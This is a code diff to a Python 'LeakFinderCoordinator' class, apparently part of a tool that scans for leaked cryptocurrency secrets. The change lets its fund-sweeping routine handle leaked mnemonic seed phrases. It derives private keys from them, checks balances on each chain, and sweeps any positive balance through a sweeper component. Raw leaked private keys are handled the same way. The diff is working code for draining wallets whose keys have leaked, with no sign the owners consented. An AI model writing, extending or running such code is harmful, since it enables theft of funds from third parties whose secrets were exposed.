@@ -257,21 +257,49 @@ class LeakFinderCoordinator:
     async def _sweep_funded(self, funded_keys: list[ExtractedKey]) -> list[SweepResult]:
         if not self._sweeper:
             return []
+        from src.modules.crypto.balance.deriver import derive_from_mnemonic
+        from src.modules.crypto.leak_finder.extractor import KeyType
         results: list[SweepResult] = []
         for key in funded_keys:
             key_hex = key.key_hex
-            if not key_hex:
-                continue
-            for chain_name, address in key.derived_addresses.items():
-                cfg = self._find_chain(chain_name)
-                if not cfg:
-                    continue
+            # For mnemonics, derive private key hex on-the-fly
+            if not key_hex and key.key_type == KeyType.MNEMONIC:
                 try:
-                    bal = await check_balance(address, cfg)
-                    if bal.balance <= 0:
-                        continue
-                    sr = await self._sweeper.sweep(private_key_hex=key_hex, chain=cfg, source_address=address, balance_raw=bal.balance_raw)
-                    results.append(sr)
+                    derived = derive_from_mnemonic(key.key_raw, chains=list(self._chains))
+                    # Build chain_name -> (address, private_key_hex) map
+                    key_map: dict[str, tuple[str, str]] = {}
+                    for d in derived:
+                        if d.private_key_hex:
+                            key_map[d.chain] = (d.address, d.private_key_hex)
                 except Exception as exc:
-                    logger.error("Sweep error: %s", exc)
+                    logger.error("Failed to derive keys from mnemonic: %s", exc)
+                    key_map = {}
+                for chain_name, address in key.derived_addresses.items():
+                    cfg = self._find_chain(chain_name)
+                    if not cfg:
+                        continue
+                    if chain_name not in key_map:
+                        continue
+                    _, pk_hex = key_map[chain_name]
+                    try:
+                        bal = await check_balance(address, cfg)
+                        if bal.balance <= 0:
+                            continue
+                        sr = await self._sweeper.sweep(private_key_hex=pk_hex, chain=cfg, source_address=address, balance_raw=bal.balance_raw)
+                        results.append(sr)
+                    except Exception as exc:
+                        logger.error("Sweep error: %s", exc)
+            elif key_hex:
+                for chain_name, address in key.derived_addresses.items():
+                    cfg = self._find_chain(chain_name)
+                    if not cfg:
+                        continue
+                    try:
+                        bal = await check_balance(address, cfg)
+                        if bal.balance <= 0:
+                            continue
+                        sr = await self._sweeper.sweep(private_key_hex=key_hex, chain=cfg, source_address=address, balance_raw=bal.balance_raw)
+                        results.append(sr)
+                    except Exception as exc:
+                        logger.error("Sweep error: %s", exc)
         return results
